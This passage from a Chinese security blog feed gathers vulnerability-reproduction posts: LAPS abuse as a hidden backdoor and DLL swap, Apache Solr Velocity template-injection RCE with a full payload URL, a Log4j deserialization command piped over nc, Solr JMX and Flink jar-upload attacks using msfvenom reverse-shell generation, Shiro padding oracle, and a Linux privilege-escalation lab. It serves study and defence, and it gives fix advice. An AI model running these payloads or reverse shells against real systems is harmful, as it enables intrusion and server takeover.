NT\SecEdit\GptTmpl.inf</code>文件、即关键组策略的完整性;</p></li><li><p>高权限的用户，设置不能被委派</p></li><li><p>主机账号需设置委派时，只能设置为约束性委派</p></li></ol><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200206142027.png-water_print" alt=""></p><h3 id="LAPS"><a href="#LAPS" class="headerlink" title="LAPS"></a>LAPS</h3><p>域网络中，主机的本地管理员很少被使用，但是给网络安全却带来了很大的风险。攻击者如果获取了本地管 理员的 NTLM，不必破解，即可通过 PTH 攻击域内其他主机。为了解决这个问题，微软在2014 年发布了 KB2871997 和 KB2928120 两个补丁，PTH 方式失效。</p><p>如果域内主机的本地管理员的口令比较简单，则可能被破解，口令仍然可被用于口令猜解或爆破的字典库、IPC 或远程桌面登录等。</p><p>微软在 2015 年发布了一个本地管理员口令解决方案 <code>LAPS(Local Administrator Password Solution)</code>，用来集中化管理域内主机本地管理员的口令。通过 <code>LAPS</code> 制作策略，强制管理域内主机的本地管理员口令，防止恶意攻击者利用本地管理员口令进行域内横向攻击。该方案包含客户端和服务器，分别安装于域内主机和域服务器</p><h4 id="LAPS-功能"><a href="#LAPS-功能" class="headerlink" title="LAPS 功能"></a>LAPS 功能</h4><ul><li>根据策略搜集本地管理员账号<code>(最多管理一个本地管理员账号)</code>，设置符合密码策略的随机口令</li><li>将新的口令上传到域服务器，并储存在域内对应的主机账号的属性中</li><li>将新的过期日期更新到主机账号属性</li><li>检查本地管理员账号的口令是否过期，如果口令过期，会产生新的随机口令，并更新 AD 中主机账号的相关属性。</li></ul><p>LAPS提供了 GUI 和 AdmPwd.PS 脚本模块 2 种管理工具。安装完成 LAPS 后，需要使用 AdmPwd.PS 模块的 <code>Set-AdmPwdComputerSelfPermission</code> 命令，赋予某个 OU 或整个域内的主机具有设置自身属性的权限。</p><p>每个主机对象能自动存储口令明和口令过期时间。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207110029.png-water_print" alt=""></p><p>在域服务器中，可通过 GUI 直接查看指定主机中本地管理员的口令明文。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207110057.png-water_print" alt=""></p><p>LAPS 在域内的主机账号属性中增加了 <code>ms-Mcs-AdmPwd</code> 和 <code>ms-Mcs-AdmPwdExpirationTime</code> 两个属性。第 1 个属性存储本地管理员的口令明文，第 2 个属性存储口令的过期时间。这里也许有读者会疑问，为什么会储存明文口令，而不是某种密文形式的口令。</p><p><code>AdmPwd.PS</code> 模块的 <code>Find-AdmPwdExtendedRights</code> 命令，可检测域内哪些账号或组具备读取  <code>ms-Mcs-AdmPwd</code> 属性的权限。</p><p>在检测某个特定的域对象的 AD 权限时，有 2 个事情需要考虑:</p><ol><li><p>是哪些域内主体可以赋予自身或其他域内主体这项 AD 权限;</p></li><li><p>是哪些已有的 ACE 包含了这项 AD 权限 ，这些 ACE 应用在哪些对象上。</p></li></ol><p>在做第 1 个事情的检查时，<code>Find-AdmPwdExtendedRights</code> 没有检测安全描述符的控制权。</p><p>在第 2 个事情的检查中，该接口通过 4 个方面来决定结果:</p><ul><li><p>AD 对象类型</p></li><li><p>ACE 访问掩码</p></li><li><p>ACE 对象类型</p></li><li><p>ACE 继承的对象类型</p></li></ul><p>在 AD 对象类型检测时，<code>Find-AdmPwdExtendedRi ghts</code> 仅仅分析应用到 OU 或计算机的 ACE，所有其他的容器对象都忽略，使用 <code>Set-AdmPwdComputerSelfPermission</code> 进行权限设置时的参数也是 OU 类型。攻击者可以在非 OU 容器对象上赋予自身读取 <code>ms-Mcs-AdmPwd</code> 属性的权限</p><p><code>msImaging-PSPs</code> 类型容器不在检测分析范围，如果将计算机对象放至该类型的容器中，则可以规避被检测</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207110928.png-water_print" alt=""></p><p>如果赋予某个低权限用户关于该类型容器的完全权限，则可以控制容器中计算机的属性，包括 <code>ms-Mcs-AdmPwd</code> 属性。</p><p><code>win7x86user</code> 是域内普通用户，<code>NotOu</code> 为一个 <code>msImaging-PSPs</code>类型容器，其中有一台机器win7x86cn，在 <code>NotOu</code>上赋予了 <code>win7x86user</code> 对该容器的全部权限，容器中的对象 <code>win7x86cn</code>继承了所有权限</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207111333.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207111440.png-water_print" alt=""></p><p>上面的测试和实验表明，在安装有 LAPS 环境的域网络中，可以有效利用 LAPS 作为一个隐蔽的后门，赋予低权限用户随时读取高权限主机本地管理员口令明文的权限，从而快速获取高权限主机的控制权，进一步通过散列值获取等方式获取域控制权限。当然这一切的前提是已经获取了域控制权限。</p><p>LAPS在客户端仅仅部署了一个 <code>AdmPwd.dll</code> 文件，用于响应来自域服务器的密码更改策略，然后将口令明文以 <code>Kerberos</code> 加密方式存储至服务器中对应的主机账号的 <code>ms-Mcs-AdmPwd</code> 属性</p><p><code>LAPS</code>起源于一个公开项目，通过对公开项目源码的分析，可以使用手动的方式模拟口令修改过程</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207112300.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207112404.png-water_print" alt=""></p><p>客户端在使用 <code>AdmPwd.dll</code> 文件时，<code>Windows</code> 并没有对该文件进行完整性校验或者签名验证。因此一个被篡改过的 <code>DLL</code> 一样可以正常使用。所以如果攻击者根据公开源码编译一个功能类似的 <code>DLL</code>，同时在 <code>DLL</code> 中添加部分功能，将修改后的口令明文写到指定位置。这可使攻击者随时都能获取口令明文，从而具备对客户端的完全控制权限</p><p>根据LAPS的安装介绍说明，在客户端上安装有3种方式，</p><ul><li><p>客户端安装 <code>LAPS.x64.msi</code> 或 <code>LAPS.x86.msi</code></p></li><li><p>在客户端使用 <code>regsvr32.exe AdmPwd.dll</code> 安装</p></li></ul><p>如果以第二种方式在客户端安装 <code>LAPS</code> ，且 <code>AdmPwd.dll</code> 的目录为普通用户的可写目录，则普通用户可直接用伪造的 <code>DLL</code> 文件替换原来真实的 <code>DLL</code> 文件。可获取本地管理员的口令明文，获取本机的完全控制权，实现权限提升</p><p><code>LAPS</code> 是微软为了加强本地管理员的口令管理，提高网络安全性而部署的解决方案，但是方案中的一些瑕疵导致 <code>LAPS</code> 可以变成攻击者制作隐蔽后门的工具。不仅 <code>LAPS</code> 如此，许多其他软件亦是如此。随着产品的增多，安全性得到提升的同时，暴露给攻击者的攻击面同时也得到了扩大。安全之路任重道远。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 域环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Solr模板注入远程代码执行漏洞</title>
      <link href="/2020/01/02/apache-solr-mo-ban-zhu-ru-yuan-cheng-dai-ma-zhi-xing-lou-dong/"/>
      <url>/2020/01/02/apache-solr-mo-ban-zhu-ru-yuan-cheng-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Solr-模板注入远程代码执行漏洞"><a href="#Apache-Solr-模板注入远程代码执行漏洞" class="headerlink" title="Apache Solr 模板注入远程代码执行漏洞"></a>Apache Solr 模板注入远程代码执行漏洞</h1><p><code>Apache Solr</code> 是美国阿帕奇（Apache）软件基金会的一款基于 Lucene（一款全文搜索引擎）的搜索服务器。<code>Apache Velocity</code> 是一个提供 <code>HTML</code> 页面模板、<code>email</code> 模板和通用开源代码生成器模板的模板引擎。在 <code>Apache Solr</code>  的多个版本中，<code>Apache Solr</code> 的 <code>VelocityResponseWriter</code> 功能的配置参数可通过 <code>HTTP</code> 请求指定，导致用户可通过设置特定参数后，通过注入任意 <code>Velocity</code> 模板造成任意命令执行。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><p>5.0.0 &lt;= Apache Solr &lt;= 8.3.1</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>可用 <code>vulhub</code> 的 <code>solr</code> 环境进行复现</p><pre class=" language-bash"><code class="language-bash">docker-compose up -ddocker-compose <span class="token function">exec</span> solr <span class="token function">bash</span> bin/solr create_core -c <span class="token function">test</span> -d example/example-DIH/solr/db</code></pre><p>将 <code>contrib/velocity/lib</code> 中以 <code>velocity</code> 开头的 <code>jar</code>包复制到 <code>server/solr-webapp/webapp/WEB-INF/lib/</code> 下:<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200102205848.png-water_print" alt=""></p><p>重启 <code>solr</code> 服务。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在满足以上环境条件的情况下，利用此漏洞分两步骤。先通过一个 <code>HTTP</code> 请求将 <code>params.resource.loader.enabled</code> 这个关键的参数设置 <code>true</code>，这样就能允许任意的模板代码从用户的 <code>HTTP</code> 请求中指定。然后再通过指定任意 <code>Velocity</code> 模板代码执行任意命令。由于 <code>Solr</code> 默认未开启认证，在这种情况下，此漏洞利用不需要登录凭据。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"update-queryresponsewriter"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"startup"</span><span class="token operator">:</span> <span class="token string">"lazy"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"velocity"</span><span class="token punctuation">,</span>    <span class="token property">"class"</span><span class="token operator">:</span> <span class="token string">"solr.VelocityResponseWriter"</span><span class="token punctuation">,</span>    <span class="token property">"template.base.dir"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token property">"solr.resource.loader.enabled"</span><span class="token operator">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span>    <span class="token property">"params.resource.loader.enabled"</span><span class="token operator">:</span> <span class="token string">"true"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200102205509.png-water_print" alt="开启params.resource.loader.enabled"></p><p>发送 payload：<br>访问：<a href="http://IP:8983" target="_blank" rel="noopener">http://IP:8983/solr/test/select?q=1&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</a></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200102205954.png-water_print" alt=""></p><p>执行 <code>id</code> 命令的返回结果：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200102210200.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200102210213.png-water_print" alt=""></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol><li>升级到 <code>Apache Solr 8.4</code></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Log4j SocketServer反序列化漏洞复现(CVE-2019-17571)</title>
      <link href="/2019/12/30/apache-log4j-socketserver-fan-xu-lie-hua-lou-dong-cve-2019-17571/"/>
      <url>/2019/12/30/apache-log4j-socketserver-fan-xu-lie-hua-lou-dong-cve-2019-17571/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Log4j-SocketServer-反序列化漏洞复现"><a href="#Apache-Log4j-SocketServer-反序列化漏洞复现" class="headerlink" title="Apache Log4j SocketServer 反序列化漏洞复现"></a>Apache Log4j SocketServer 反序列化漏洞复现</h1><p><code>Apache Log4j</code> 是一个基于 <code>Java</code> 的日志记录工具，是 <code>Apache</code> 软件基金会的一个项目，是几种 <code>Java</code> 日志框架之一。</p><p>近日，<code>Apache Log4j</code> 官方披露在 <code>1.2.x</code> 版本中的SocketServer类存在反序列化漏洞（<code>CVE-2019-17571</code>），攻击者可利用漏洞可实现远程代码执行。</p><p>Log4j <code>1.2.x</code> 版本中的 <code>org.apache.log4j.net.SocketServer</code> 类，存在反序列化漏洞。使用 <code>Log4j SocketServer</code> 类创建的 <code>Socket</code> 监听服务处理接受数据时，容易对不可信数据进行反序列化，结合反序列化小工具，攻击者可以实现远程代码执行。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用到的 <code>jar</code> 包:<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191230094353.png-water_print" alt=""></p><pre class=" language-bash"><code class="language-bash">java -cp log4j-1.2.17.jar:commons-collections-3.1.jar org.apache.log4j.net.SocketServer 8888 ./log4jserver.properties ./</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191230094410.png-water_print" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre class=" language-bash"><code class="language-bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 <span class="token string">"open -a Calculator"</span> <span class="token operator">|</span> nc 127.0.0.1 8888</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191230094442.png-water_print" alt=""></p><p>发送 payload 后，成功弹出计算器：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191230094518.png-water_print" alt=""></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol><li><p>Apache Log4j 的 1.2 系列版本官方在2015年8月已停止维护，在 2.8.2 版本中已修复了该漏洞，建议尽快升级到 2.8.2 或更高的版本；<br>下载地址：<a href="https://logging.apache.org/log4j/2.x/download.html" target="_blank" rel="noopener">https://logging.apache.org/log4j/2.x/download.html</a></p></li><li><p>停止使用 Log4j 的 SocketServer 类创建 Socket 服务，未使用 Log4j 的 SocketServer 类的功能不受漏洞影响；</p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Solr CVE-2019-12409 RCE 漏洞复现</title>
      <link href="/2019/11/20/apache-solr-cve-2019-12409-rce-lou-dong-fu-xian/"/>
      <url>/2019/11/20/apache-solr-cve-2019-12409-rce-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Solr-CVE-2019-12409-RCE-漏洞复现"><a href="#Apache-Solr-CVE-2019-12409-RCE-漏洞复现" class="headerlink" title="Apache Solr CVE-2019-12409 RCE 漏洞复现"></a>Apache Solr CVE-2019-12409 RCE 漏洞复现</h1><p>该漏洞源于默认配置文件 <code>solr.in.sh</code> 中的 <code>ENABLE_REMOTE_JMX_OPTS</code> 配置选项存在安全风险。</p><p>如果使用受影响版本中的默认 <code>solr.in.sh</code> 文件，那么将启用JMX监视并将其暴露在RMI_PORT上（默认值= 18983），并且无需进行任何身份验证。 如果防火墙中的入站流量打开了此端口，则具有 <code>Solr</code> 节点网络访问权限的任何人都将能够访问 <code>JMX</code>，并且可以上传恶意代码在 <code>Solr</code> 服务器上执行。</p><p>该漏洞不影响 <code>Windows</code> 系统的用户,仅影响部分版本的 <code>Linux</code> 用户。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol><li>写入 docker-compose.yml 文件：</li></ol><pre class=" language-yml"><code class="language-yml">version: '2'services: solr:   image: vulhub/solr:8.1.1   ports:    - "8983:8983"    - "18983:18983"</code></pre><ol start="2"><li>运行漏洞环境：</li></ol><pre class=" language-bash"><code class="language-bash">docker-compose up -ddocker-compose <span class="token function">exec</span> solr <span class="token function">bash</span> bin/solr create_core -c <span class="token function">test</span> -d example/example-DIH/solr/db</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120102951.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120102958.png-water_print" alt=""></p><ol start="3"><li>查看Docker靶机环境是否开启了漏洞配置：</li></ol><pre class=" language-bash"><code class="language-bash">docker <span class="token function">ps</span> -a <span class="token comment" spellcheck="true">#查看当前运行容器的CONTAINER ID </span>docker <span class="token function">exec</span> -it CONTAINER ID  /bin/bash <span class="token comment" spellcheck="true">#docker的solr的配置文件默认在/etc/default里面</span><span class="token function">cat</span> /etc/default/solr.in.sh <span class="token operator">|</span><span class="token function">grep</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">#如下图显示即为开启的漏洞配置</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120103152.png-water_print" alt=""></p><p>浏览器访问：<code>http://IP:8983</code>，即可查看到 Apache solr 的管理页面，无需登录。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol><li><p>打开 msf，配置 payload<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120103642.png-water_print" alt=""></p></li><li><p>设置攻击者与受害者 IP</p></li><li><p>执行<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120104851.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120104900.png-water_print" alt=""></p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Flink 任意 Jar 包上传导致 RCE 漏洞</title>
      <link href="/2019/11/20/flink-ren-yi-jar-bao-shang-chuan-dao-zhi-rce-lou-dong/"/>
      <url>/2019/11/20/flink-ren-yi-jar-bao-shang-chuan-dao-zhi-rce-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Flink-任意-Jar-包上传导致-RCE-漏洞"><a href="#Apache-Flink-任意-Jar-包上传导致-RCE-漏洞" class="headerlink" title="Apache Flink 任意 Jar 包上传导致 RCE 漏洞"></a>Apache Flink 任意 Jar 包上传导致 RCE 漏洞</h1><p>Apache Flink 是一个分布式大数据处理引擎，可对有限数据流和无限数据流进行有状态计算。可部署在各种集群环境，对各种大小的数据规模进行快速计算。</p><p>ApacheFlink 是由 Apache 软件基金会开发的开源流处理框架，其核心是用 Java 和 Scala 编写的分布式流数据流引擎。Flink 以数据并行和流水线方式执行任意流数据程序，Flink 的流水线运行时系统可以执行批处理和流处理程序。此外，Flink 的运行时本身也支持迭代算法的执行。</p><p>攻击者可利用该漏洞在 Apache Flink Dashboard 页面中上传任意 Jar 包，利用 Metasploit 在Apache Flink 服务器中执行任意代码，获取服务器最高权限，所以危害性较大。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul><li>Apache Flink &lt;= 1.9.1</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol><li>下载 <code>Apache Flink 1.9.1</code> 包：</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">wget</span> http://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz</code></pre><ol start="2"><li>解压安装包：</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">tar</span> –zxvf flink-1.9.1-bin-scala_2.11.tgz</code></pre><ol start="3"><li>进入到 bin 目录下面启动 Flink：</li></ol><pre class=" language-bash"><code class="language-bash">./start-cluster.sh</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120100828.png-water_print" alt="运行截图"></p><p>浏览器访问：<code>http://IP:8081</code></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol><li>msf 生成 reverse shell 的马</li></ol><pre class=" language-bash"><code class="language-bash">msfvenom -p java/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>IP LPORT<span class="token operator">=</span>4444 -f jar <span class="token operator">></span> shell.jar</code></pre><ol start="2"><li>msf 设置监听</li></ol><pre class=" language-bash"><code class="language-bash">use exploit/multi/handler<span class="token keyword">set</span> payload java/shell/reverse_tcpexpolit</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120101314.png-water_print" alt=""></p><ol start="3"><li>上传 <code>shell.jar</code> 并提交</li></ol><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120101314.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120101609.png-water_print" alt=""></p><ol start="4"><li>反弹回的 <code>shell</code></li></ol><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120101816.png-water_print" alt=""></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ul><li>将 Apache Flink 升级最新版本</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Shiro padding oracle attack漏洞复现</title>
      <link href="/2019/11/18/apache-shiro-padding-oracle-attack-lou-dong-fu-xian/"/>
      <url>/2019/11/18/apache-shiro-padding-oracle-attack-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Shiro-padding-oracle-attack漏洞复现"><a href="#Apache-Shiro-padding-oracle-attack漏洞复现" class="headerlink" title="Apache Shiro padding oracle attack漏洞复现"></a>Apache Shiro padding oracle attack漏洞复现</h1><p>Shiro 使用了 AES-128-CBC 模式对 cookie 进行加密，导致恶意用户可以通过 padding oracle 攻击方式构造序列化数据进行反序列化攻击。</p><p>例如之前爆出来的 <a href="https://www.jianshu.com/p/0007eafd1f92" target="_blank" rel="noopener">SHIRO-550</a> 漏洞就是关于 remember 这个cookie 的问题。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>shiro 打包环境下载地址 <a href="https://github.com/jas502n/SHIRO-721" target="_blank" rel="noopener">https://github.com/jas502n/SHIRO-721</a></p><p>exp 下载地址 <a href="https://github.com/Geekby/shiro_rce_exp" target="_blank" rel="noopener">https://github.com/Geekby/shiro_rce_exp</a></p><p>复现环境：ubuntu16.04 + tomcat8 + shiro 1.4.1</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> tomcat8 tomcat8-docs tomcat8-examples tomcat8-admin</code></pre><p>然后将下载好的 <code>samples-web-1.4.1.war</code> 包部署到 <code>tomcat</code> 上。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol><li><p>访问shiro登录页面<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120105640.png-water_print" alt=""></p></li><li><p>输入用户名密码，点击 Remember Me<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120105850.png-water_print" alt=""></p></li><li><p>访问任意页面，得到 Cookie 中的 rememberMe<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120105923.png-water_print" alt=""></p></li><li><p>生成 java class payload<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120105957.png-water_print" alt=""></p></li><li><p>执行exp<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120110023.png-water_print" alt=""></p></li></ol><p>得到padding oracle attack后的cookie</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120110056.png-water_print" alt=""></p><p><code>注</code>：破解时间较长，大概持续100min - 120min左右。</p><ol start="6"><li><p>复制该cookie，重放数据包<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120110159.png-water_print" alt=""></p></li><li><p>检查执行结果<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191120110222.png-water_print" alt=""></p></li></ol><p>发现success文件成功被创建，命令可以被执行</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/192819" target="_blank" rel="noopener">https://www.anquanke.com/post/id/192819</a></p><p><a href="https://github.com/jas502n/SHIRO-721" target="_blank" rel="noopener">https://github.com/jas502n/SHIRO-721</a></p><p><a href="https://github.com/wuppp/shiro_rce_exp" target="_blank" rel="noopener">https://github.com/wuppp/shiro_rce_exp</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>in.security 提权靶场</title>
      <link href="/2019/10/31/lin.security-ti-quan-ba-chang/"/>
      <url>/2019/10/31/lin.security-ti-quan-ba-chang/</url>
      
        <content type="html"><![CDATA[<h1 id="in-security-提权靶场"><a href="#in-security-提权靶场" class="headerlink" title="in.security 提权靶场"></a>in.security 提权靶场</h1><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031092159.png-water_print" alt=""><br>lin.security 靶场 是 Linux 配置问题导致提权的靶场，它基于Ubuntu（18.04 LTS）的 Linux 虚拟机，靶场提供许多权限提升的漏洞供我们练习关于 linux 权限的相关知识，下面是这个靶场的下载链接：<br><a href="https://in.security/downloads/lin.security_v1.0.ova" target="_blank" rel="noopener">https://in.security/downloads/lin.security_v1.0.ova</a></p><h2 id="用户的-sudo-权限"><a href="#用户的-sudo-权限" class="headerlink" title="用户的 sudo 权限"></a>用户的 sudo 权限</h2><p>sudo 其实是很常用的命令了，sudo 权限则是 root 把本来只能超级用户执行的命令赋予普通用户执行，这里的命令指的是系统命令，对于 linux 来说一切皆是文件，所以系统命令也是一个文件。</p><p>一般来讲当管理员需要某个用户在执行 root 权限的命令时，会去配置 sudo。具体是修改 <code>/etc/sudoers</code> 这个文件。但是普通用户其实是查看和操作这个文件的，他只能查看自己是否被配置了 sudo 权限。普通用户可以采用 <code>sudo -l</code> 这个命令来查看自己是否有 sudo 配置。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093053.png-water_print" alt=""></p><p>bob 这个用户可以执行很多的命令，利用这些命令可以简单直接提升到 root 权限。</p><h3 id="bin-ash"><a href="#bin-ash" class="headerlink" title="/bin/ash"></a>/bin/ash</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093521.png-water_print" alt=""></p><h3 id="usr-bin-awk"><a href="#usr-bin-awk" class="headerlink" title="/usr/bin/awk"></a>/usr/bin/awk</h3><p>查看密码文件 <code>/etc/shadow</code><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031094733.png-water_print" alt=""></p><h3 id="usr-bin-curl"><a href="#usr-bin-curl" class="headerlink" title="/usr/bin/curl"></a>/usr/bin/curl</h3><p><img 